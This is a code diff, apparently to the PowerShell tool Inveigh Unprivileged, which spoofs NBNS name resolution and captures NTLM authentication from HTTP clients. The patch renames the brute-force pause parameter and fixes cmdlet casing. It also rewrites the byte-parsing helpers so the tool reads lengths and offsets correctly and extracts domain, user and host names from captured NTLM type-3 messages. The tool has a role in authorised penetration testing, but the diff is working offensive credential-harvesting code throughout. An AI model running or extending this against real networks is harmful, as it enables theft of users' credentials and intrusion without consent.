@@ -65,7 +65,7 @@ Default = WPAD: Specify a hostname for NBNS spoofing.
 .PARAMETER NBNSBruteForce
 Default = Disabled: (Y/N) Enable/Disable NBNS brute force spoofing.
 
-.PARAMETER NBNSPause
+.PARAMETER NBNSBruteForcePause
 Default = Disabled: (Integer) Specify the number of seconds the NBNS brute force spoofer will stop spoofing after
 an incoming HTTP request is received.
 
@@ -345,7 +345,7 @@ else
 $inveigh.status_queue.Add("Inveigh Unprivileged started at $(Get-Date -format 's')") > $null
 $inveigh.log.Add($inveigh.log_file_queue[$inveigh.log_file_queue.Add("$(Get-Date -format 's') - Inveigh Unprivileged started")])  > $null
 
-$firewall_status = netsh advfirewall show allprofiles state | where {$_ -match 'ON'}
+$firewall_status = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}
 
 if($firewall_status)
 {
@@ -639,19 +639,28 @@ if($inveigh.status_output)
 # Shared Basic functions ScriptBlock
 $shared_basic_functions_scriptblock =
 {
-    function DataLength
+
+    function DataLength2
     {
         param ([Int]$length_start,[Byte[]]$string_extract_data)
 
-        $string_length = [System.BitConverter]::ToInt16($string_extract_data[$length_start..($length_start + 1)],0)
+        $string_length = [System.BitConverter]::ToUInt16($string_extract_data[$length_start..($length_start + 1)],0)
+        return $string_length
+    }
+
+    function DataLength4
+    {
+        param ([Int]$length_start,[Byte[]]$string_extract_data)
+
+        $string_length = [System.BitConverter]::ToUInt32($string_extract_data[$length_start..($length_start + 3)],0)
         return $string_length
     }
 
     function DataToString
     {
-        param ([Int]$string_length,[Int]$string2_length,[Int]$string3_length,[Int]$string_start,[Byte[]]$string_extract_data)
+        param ([Int]$string_start,[Int]$string_length,[Byte[]]$string_extract_data)
 
-        $string_data = [System.BitConverter]::ToString($string_extract_data[($string_start+$string2_length+$string3_length)..($string_start+$string_length+$string2_length+$string3_length - 1)])
+        $string_data = [System.BitConverter]::ToString($string_extract_data[$string_start..($string_start + $string_length - 1)])
         $string_data = $string_data -replace "-00",""
         $string_data = $string_data.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         $string_extract = New-Object System.String ($string_data,0,$string_data.Length)
@@ -851,10 +860,10 @@ $HTTP_scriptblock =
             elseif ($HTTP_request_bytes[8] -eq 3)
             {
                 $NTLM = 'NTLM'
-                $HTTP_NTLM_offset = $HTTP_request_bytes[24]
-                $HTTP_NTLM_length = DataLength 22 $HTTP_request_bytes
-                $HTTP_NTLM_domain_length = DataLength 28 $HTTP_request_bytes
-                $HTTP_NTLM_domain_offset = DataLength 32 $HTTP_request_bytes
+                $HTTP_NTLM_length = DataLength2 20 $HTTP_request_bytes
+                $HTTP_NTLM_offset = DataLength4 24 $HTTP_request_bytes
+                $HTTP_NTLM_domain_length = DataLength2 28 $HTTP_request_bytes
+                $HTTP_NTLM_domain_offset = DataLength4 32 $HTTP_request_bytes
                 [String] $NTLM_challenge = $inveigh.HTTP_challenge_queue -like $inveigh.HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString + $inveigh.HTTP_client.Client.RemoteEndpoint.Port + '*'
                 $inveigh.HTTP_challenge_queue.Remove($NTLM_challenge)
                 $NTLM_challenge = $NTLM_challenge.Substring(($NTLM_challenge.IndexOf(","))+1)
@@ -865,13 +874,15 @@ $HTTP_scriptblock =
                 }
                 else
                 {  
-                    $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_length 0 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
+                    $HTTP_NTLM_domain_string = DataToString $HTTP_NTLM_domain_offset $HTTP_NTLM_domain_length $HTTP_request_bytes
                 } 
                     
-                $HTTP_NTLM_user_length = DataLength 36 $HTTP_request_bytes
-                $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_length $HTTP_NTLM_domain_length 0 $HTTP_NTLM_domain_offset $HTTP_request_bytes
-                $HTTP_NTLM_host_length = DataLength 44 $HTTP_request_bytes
-                $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_length $HTTP_NTLM_domain_length $HTTP_NTLM_user_length $HTTP_NTLM_domain_offset $HTTP_request_bytes
+                $HTTP_NTLM_user_length = DataLength2 36 $HTTP_request_bytes
+                $HTTP_NTLM_user_offset = DataLength4 40 $HTTP_request_bytes
+                $HTTP_NTLM_user_string = DataToString $HTTP_NTLM_user_offset $HTTP_NTLM_user_length $HTTP_request_bytes
+                $HTTP_NTLM_host_length = DataLength2 44 $HTTP_request_bytes
+                $HTTP_NTLM_host_offset = DataLength4 48 $HTTP_request_bytes
+                $HTTP_NTLM_host_string = DataToString $HTTP_NTLM_host_offset $HTTP_NTLM_host_length $HTTP_request_bytes
         
                 if($HTTP_NTLM_length -eq 24) # NTLMv1
                 {
@@ -1422,13 +1433,13 @@ $control_unprivileged_scriptblock =
 
     if($RunTime)
     {    
-        $control_timeout = new-timespan -Minutes $RunTime
+        $control_timeout = New-TimeSpan -Minutes $RunTime
         $control_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
     }
 
     if($NBNSBruteForcePause)
     {   
-        $NBNS_pause = new-timespan -Seconds $NBNSBruteForcePause
+        $NBNS_pause = New-TimeSpan -Seconds $NBNSBruteForcePause
     }
        
     while ($inveigh.unprivileged_running)
@@ -1648,7 +1659,7 @@ if($inveigh.console_output)
 
     if($ConsoleStatus)
     {    
-        $console_status_timeout = new-timespan -Minutes $ConsoleStatus
+        $console_status_timeout = New-TimeSpan -Minutes $ConsoleStatus
         $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
     }
 
